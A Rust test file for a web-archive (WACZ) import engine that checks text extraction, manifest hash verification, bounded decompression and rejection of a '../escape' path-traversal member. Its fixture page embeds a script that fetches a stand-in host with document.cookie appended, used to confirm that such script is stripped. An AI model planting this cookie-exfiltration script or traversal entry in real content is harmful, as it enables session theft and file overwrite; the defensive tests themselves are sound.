//! Risk basis: untrusted imports must not publish corrupt archives; derivatives
//! must not lose payloads, overwrite originals, or execute captured credentials.
use super::*;
use std::io::Write;
use zip::{write::SimpleFileOptions, CompressionMethod, ZipWriter};

fn write_zip(path: &Path, entries: Vec<(&str, Vec<u8>)>) {
    let mut zip = ZipWriter::new(std::fs::File::create(path).unwrap());
    for (name, data) in entries {
        zip.start_file(
            name,
            SimpleFileOptions::default().compression_method(CompressionMethod::Stored),
        )
        .unwrap();
        zip.write_all(&data).unwrap();
    }
    zip.finish().unwrap();
}
pub(super) fn fixture(path: &Path) {
    let payload=b"<!doctype html><html><head><title>Archive fixture</title></head><body><h1>Saved content</h1><div class=ad>Remove me</div><script>fetch('https://leak.invalid/cookie?'+document.cookie)</script><img src='/shared.png'><p>Readable words.</p></body></html>";
    let block=[format!("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\n\r\n",payload.len()).as_bytes(),payload].concat();
    let raw=[format!("WARC/1.1\r\nWARC-Type: response\r\nWARC-Target-URI: https://example.test/\r\nWARC-Date: 2026-01-02T03:04:05Z\r\nWARC-Record-ID: <urn:uuid:fixture>\r\nContent-Type: application/http; msgtype=response\r\nContent-Length: {}\r\n\r\n",block.len()).as_bytes(),&block,b"\r\n\r\n"].concat();
    let mut encoder = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
    encoder.write_all(&raw).unwrap();
    let warc = encoder.finish().unwrap();
    let index=format!("test,example)/ 20260102030405 {}\n",serde_json::json!({"url":"https://example.test/","filename":"capture.warc.gz","offset":0,"length":warc.len(),"status":"200","mime":"text/html"})).into_bytes();
    let pages=b"{\"format\":\"json-pages-1.0\",\"id\":\"pages\"}\n{\"url\":\"https://example.test/\",\"title\":\"Archive fixture\",\"ts\":\"2026-01-02T03:04:05Z\"}\n".to_vec();
    let entries = vec![
        ("archive/capture.warc.gz", warc),
        ("indexes/index.cdxj", index),
        ("pages/pages.jsonl", pages),
    ];
    let resources:Vec<_>=entries.iter().map(|(name,bytes)|serde_json::json!({"path":name,"name":name,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
    let manifest=serde_json::to_vec(&serde_json::json!({"profile":"data-package","wacz_version":"1.1.1","title":"Fixture","resources":resources})).unwrap();
    let mut entries = entries;
    entries.push(("datapackage.json", manifest));
    write_zip(path, entries);
}
#[test]
fn archive_engine_import_fixity_and_actual_inventory() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("fixture.wacz");
    fixture(&path);
    let report = inspect_archive(&path).unwrap();
    assert_eq!(report.resources.len(), 1);
    assert_eq!(report.pages.len(), 1);
    assert!(report.pages[0].text.contains("Saved content"));
    assert!(!report.pages[0].text.contains("document.cookie"));
    assert_eq!(
        report.archive_bytes,
        report.unique_payload_bytes + report.duplicate_payload_bytes + report.metadata_bytes
    );
    let verification = verify_archive(&path).unwrap();
    assert!(verification.valid);
    assert!(verification
        .checks
        .iter()
        .any(|c| c.name == "offline-browser-replay" && c.status == "not-run"));
}
#[test]
fn archive_engine_rejects_unsafe_member_and_corrupt_manifest() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("unsafe.wacz");
    write_zip(&path, vec![("../escape", vec![0])]);
    assert!(inspect_archive(&path).is_err());
    write_zip(
        &path,
        vec![
            ("archive/a.warc.gz", vec![1]),
            (
                "datapackage.json",
                br#"{"resources":[{"path":"archive/a.warc.gz","bytes":1,"hash":"sha256:wrong"}]}"#
                    .to_vec(),
            ),
        ],
    );
    assert!(inspect_archive(&path).unwrap_err().contains("SHA-256"));
}
#[test]
fn archive_engine_bounded_inflation() {
    assert!(read::bounded(&b"12345"[..], 4).is_err());
}
